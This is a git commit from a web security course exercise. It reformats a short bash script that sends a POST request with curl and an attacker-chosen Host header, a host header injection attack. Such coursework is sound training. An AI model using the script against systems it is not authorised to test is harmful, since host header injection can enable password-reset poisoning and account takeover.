501bda1d2a0d718bdc7ade57b7fba2637888164d
omayma199 <5752@holbertonstudents.com>
2024-07-17 13:38:42 +0100

    test

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,3 +1,2 @@
 #!/bin/bash
-[ "$#" -ne 3 ] && { echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"; exit 1; }
-curl -s -X POST "$2" -H "Host: $1" -d "$3"
+[ "$#" -ne 3 ] && { echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"; exit 1; } || curl -s -X POST "$2" -H "Host: $1" -d "$3"
